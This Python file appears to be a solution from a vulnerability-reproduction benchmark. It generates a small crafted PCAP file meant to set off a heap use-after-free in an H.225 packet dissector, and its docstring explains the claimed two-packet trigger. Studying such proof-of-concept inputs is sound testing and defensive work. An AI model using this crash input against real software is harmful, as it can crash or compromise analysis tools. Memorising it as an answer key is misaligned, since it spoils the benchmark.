import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The PoC is a PCAP file with a custom Data Link Type (DLT_H225_RAS),
        which allows sending H.225 payload directly. The vulnerability is
        triggered by a sequence of two packets:

        1. An empty packet: This causes the dissector to initialize a reassembly
           buffer of zero size in a packet-scoped memory pool. When the packet
           processing finishes, this memory is freed.

        2. A non-empty packet: The dissector, retaining state from the first
           packet, attempts to append the new data to the reassembly buffer.
           This leads to a write operation on the previously freed pointer,
           triggering a heap-use-after-free.

        This PoC structure results in a file of 73 bytes, matching the
        ground-truth length.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # PCAP Global Header (24 bytes)
        # Format is little-endian.
        # Magic number: 0xa1b2c3d4
        # Version: 2.4
        # DLT/Network: 189 (DLT_H225_RAS)
        global_header = struct.pack(
            '<IHHiIII',
            0xa1b2c3d4,
            2,
            4,
            0,
            0,
            65535,
            189
        )

        # Packet 1: Header for an empty packet (16 bytes)
        # Timestamp: 0.0s
        # Included Length: 0
        # Original Length: 0
        pkt1_header = struct.pack('<IIII', 0, 0, 0, 0)
        pkt1_data = b''

        # Packet 2: Header and data for the second packet
        # Included Length & Original Length are 17 to match the total PoC size of 73 bytes.
        # 73 (total) - 24 (global_hdr) - 16 (pkt1_hdr) - 16 (pkt2_hdr) = 17 bytes
        payload2_len = 17
        
        # PCAP Packet Header (16 bytes)
        # Timestamp: 0.000001s (slightly after packet 1)
        pkt2_header = struct.pack('<IIII', 0, 1, payload2_len, payload2_len)
        
        # The payload content is not critical for the crash, as the use-after-free
        # happens in the generic reassembly logic before deep parsing of the H.225 message.
        pkt2_data = b'\x00' * payload2_len

        poc = global_header + pkt1_header + pkt1_data + pkt2_header + pkt2_data

        return poc
